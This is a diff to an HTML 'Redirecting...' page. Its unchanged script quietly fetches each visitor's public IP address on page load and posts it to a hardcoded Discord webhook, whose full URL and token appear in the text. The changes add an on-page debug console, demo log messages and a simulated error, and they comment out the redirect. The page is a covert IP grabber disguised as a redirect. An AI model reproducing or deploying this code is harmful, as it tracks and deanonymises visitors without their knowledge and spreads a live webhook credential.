@@ -1,9 +1,60 @@
 <!doctype html>
 <html style="background-color:#222; color:#fff; ">
   <head>
+    <style>
+        #console {
+            background-color: #000;
+            color: #0f0;
+            padding: 10px;
+            height: 300px;
+            overflow-y: scroll;
+            font-family: monospace;
+            white-space: pre-wrap;
+        }
+        .log { color: #0f0; }
+        .error { color: #f00; }
+        .warn { color: #ff0; }
+        .info { color: #00f; }
+    </style>
     <title>Redirecting...</title>
     <script>
     async function fetching() {
+const consoleDiv = document.getElementById('console');
+
+function log(msg, type = 'log') {
+    const div = document.createElement('div');
+    div.className = type;
+    div.textContent = msg;
+    consoleDiv.appendChild(div);
+    consoleDiv.scrollTop = consoleDiv.scrollHeight;
+}
+
+['log', 'error', 'warn', 'info'].forEach(function(method) {
+    const original = console[method];
+    console[method] = function(...args) {
+        log(args.join(' '), method);
+        original.apply(console, args);
+    };
+});
+
+window.onerror = function(msg, url, lineNo, columnNo, error) {
+    log(`Error: ${msg} at ${url}:${lineNo}:${columnNo}`, 'error');
+    if (error && error.stack) {
+        log(error.stack, 'error');
+    }
+    return false;
+};
+
+// Example usage
+console.log('This is a log message.');
+console.error('This is an error message.');
+console.warn('This is a warning message.');
+console.info('This is an info message.');
+
+// Simulating an uncaught exception
+setTimeout(() => {
+    throw new Error('Simulated exception');
+}, 1000);
       const webhook = 'https://discord.com/api/webhooks/1216841205883600928/kipzeUzJu0dF3FGPae2uzI7DDP6-uHJb3hkEy1kpf6MA80MqhJWIJCWZDTvvv3xRZdOK';
       let dat = await fetch('https://api.ipify.org?format=json')
       dat = JSON.parse(await dat.text())['ip']
@@ -27,12 +78,13 @@
                       }],
                   }), headers: { "content-type": "application/json" }, method: "POST"
       })
-      window.location.href = redirect;
+      //window.location.href = redirect;
     }
     // <meta http-equiv="refresh" content="2; URL=https://www.youtube.com/watch?v=xvFZjo5PgG0" />
     fetching()
     </script>
   </head>
   <body>
+    <div id="console"></div>
   </body>
 </html>
